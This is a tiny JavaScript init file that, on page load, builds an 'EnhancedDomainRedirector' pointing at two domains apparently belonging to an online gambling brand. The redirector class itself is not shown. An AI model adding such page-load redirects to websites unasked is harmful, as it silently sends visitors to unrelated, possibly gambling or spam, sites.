// init.js
const securedomains = [
    'https://mnctotogacor.net',
    'https://mnctoto.fr'
];

document.addEventListener('DOMContentLoaded', () => {
    const redirector = new EnhancedDomainRedirector(securedomains);
    redirector.init();
});
